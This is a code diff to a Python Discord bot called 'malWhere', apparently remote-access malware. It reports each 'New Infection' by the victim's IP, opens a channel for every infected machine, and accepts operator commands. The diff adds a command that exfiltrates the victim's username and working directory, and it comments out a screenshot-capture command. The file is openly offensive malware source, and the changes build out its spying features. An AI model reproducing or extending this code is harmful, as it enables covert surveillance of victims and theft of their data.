@@ -3,13 +3,12 @@ import os
 import requests
 import discord
 from discord.ext import commands
-from dotenv import load_dotenv
 import json
 import base64
-import pyautogui
+#import pyautogui
+import getpass
 
-load_dotenv()
-encryptedapi="<base64 encoded api key>"
+encryptedapi="base64 encoded api key>="
 base64_string =encryptedapi
 base64_bytes = base64_string.encode("ascii")
 sample_string_bytes = base64.b64decode(base64_bytes)
@@ -55,11 +54,12 @@ async def on_ready():
   #clone necesssary files into startup 
   existing_channel = discord.utils.get(guild.channels, name=ip4chan)
   if not existing_channel:
-    embed=discord.Embed(title="New Infection", url="", description=(f"New Infection from {ip} connection is established.. wating for commands")
+    embed=discord.Embed(title="New Infection", url="", description=(f"New Infection from {ip} connection is established.. wating for commands"))
     await guild.create_text_channel(ip)
     await infectionschannel.send(embed=embed)
   else:
-    embed=discord.Embed(title="Duplicate Infection", url="", description=(f"{ip} already infected connection is established.. wating for commands")
+    embed=discord.Embed(title="Duplicate Infection", url="", description=(f"{ip} already infected connection is established.. wating for commands"))
+    await infectionschannel.send(embed=embed)
 
 @malWhere.command()
 async def geolocate(ctx):
@@ -80,18 +80,27 @@ async def geolocate(ctx):
 
 
 #out of order due to replit having issues with xauth and ./xauthority files
-@malWhere.command()
-async def screenshot(ctx):
-  existing_channel = discord.utils.get(guild.channels, name=ip4chan)
-  if not existing_channel:
-    await guild.create_text_channel(f"{ip} media")
-myScreenshot = pyautogui.screenshot()
-myScreenshot.save(r'tempimage.png')
-channel = discord.utils.get(ctx.guild.channels, name=f"{ip} media")
-channel_id = channel.id
-mediachan=malWhere.get_channel(channel_id)
-mediachan.send(image="tempimage.png")
+# @malWhere.command()
+# async def screenshot(ctx):
+#   existing_channel = discord.utils.get(guild.channels, name=ip4chan)
+#   if not existing_channel:
+#     await guild.create_text_channel(f"{ip} media")
+# myScreenshot = pyautogui.screenshot()
+# myScreenshot.save(r'tempimage.png')
+# channel = discord.utils.get(ctx.guild.channels, name=f"{ip} media")
+# channel_id = channel.id
+# mediachan=malWhere.get_channel(channel_id)
+# mediachan.send(image="tempimage.png")
 #############################################################################
+
+@malWhere.command()
+async def pcinfo(ctx):
+  if str(ctx.channel)==(ip4chan):
+    embed=discord.Embed(title="PCData", url="", description=f"{ip}'s PC data", color=0xFF5733)
+    embed.add_field(name="Username", value=getpass.getuser(), inline=False)
+    embed.add_field(name="Current Working Directory", value=os.getcwd(), inline=False)
+    await ctx.send(embed=embed)
+  await ctx.channel.send("wrong channel skid")
 
 
 malWhere.run(TOKEN)
